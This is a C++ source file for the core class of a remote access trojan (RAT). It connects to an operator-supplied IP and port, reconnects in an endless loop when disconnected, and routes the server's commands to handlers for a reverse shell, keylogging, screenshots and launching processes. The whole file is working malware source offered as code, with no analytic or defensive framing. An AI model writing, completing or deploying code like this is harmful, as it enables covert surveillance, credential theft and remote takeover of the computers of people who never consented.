#include "Rat.h"

#include <utility>

#include "ChatHandler.h"
#include "CommunicationContainerBuilder.h"
#include "CreateProcessHandler.h"
#include "KeyLoggerHandler.h"
#include "ReverseShellHandler.h"
#include "TakeScreenshotHandler.h"
#include "Trace.h"

Rat::Rat(
	ICommunicationFactory* factory,
	const char* ip,
	const int port
) :
	_container(CreateContainer(factory, ip, port)),
	_client(_container->resolve<IConnectionFactory>()),
	_connection(_container->resolve<IConnection>()),
	_sender(_container->resolve<IMessageSender>()),
	_listener(_container->resolve<IMessageListener>()),
	_handlers(GetHandlers())
{
}

std::shared_ptr<Hypodermic::Container> Rat::CreateContainer(
	ICommunicationFactory* factory,
	const char* ip,
	const int port)
{
	Hypodermic::ContainerBuilder builder;

	const auto communicationsBuilder = CommunicationContainerBuilder(
		factory,
		ip,
		port,
		[this](const MessageType t, const SharedSpan c) { OnMessage(t, c); },
		[this] { OnDisconnection(); });

	builder.addRegistrations(communicationsBuilder);

	builder.registerType<ReverseShellHandler>();
	builder.registerType<KeyLoggerHandler>();
	builder.registerType<ChatHandler>();
	builder.registerType<CreateProcessHandler>();
	builder.registerType<TakeScreenshotHandler>();

	return builder.build();
}

std::map<MessageType, std::shared_ptr<IMessageHandler>> Rat::GetHandlers() const
{
	const auto reverseShellHandler = _container->resolve<ReverseShellHandler>();
	const auto keyLoggerHandler = _container->resolve<KeyLoggerHandler>();

	return {
		{ MessageType::Chat, _container->resolve<ChatHandler>() },
		{ MessageType::CreateProcessS, _container->resolve<CreateProcessHandler>() },
		{ MessageType::StartReverseShell, reverseShellHandler },
		{ MessageType::StopReverseShell, reverseShellHandler },
		{ MessageType::ReverseShellMessage, reverseShellHandler },
		{ MessageType::TakeScreenshot, _container->resolve<TakeScreenshotHandler>() },
		{ MessageType::StartKeyLog, keyLoggerHandler },
		{ MessageType::StopKeyLog, keyLoggerHandler }
	};
}

void Rat::OnMessage(MessageType type, SharedSpan content)
{
	try
	{
		_handlers[type]->Handle(type, std::move(content));
	}
	catch (std::exception& e)
	{
		printf(e.what());
	}
}

void Rat::OnDisconnection()
{
	Trace("Server disconnected! Trying to reconnect\n");

	bool connected = false;
	while (!connected)
	{
		try
		{
			//_connection.reset();
			*_connection = *_client->Connect();
			connected = true;
		}
		catch (std::runtime_error&)
		{
			Trace("Failed to connect! Trying to reconnect\n");
		}
	}
}
